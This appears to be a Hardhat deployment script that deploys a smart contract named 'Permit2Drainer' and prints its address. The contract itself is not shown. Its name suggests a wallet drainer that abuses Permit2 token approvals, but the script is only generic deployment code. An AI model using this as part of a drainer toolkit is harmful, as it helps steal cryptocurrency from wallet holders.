const hre = require("hardhat");

async function main() {
  const Permit2Drainer = await hre.ethers.getContractFactory("Permit2Drainer");
  const drainer = await Permit2Drainer.deploy();

  await drainer.waitForDeployment();

  console.log("Permit2Drainer deployed to:", await drainer.getAddress());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
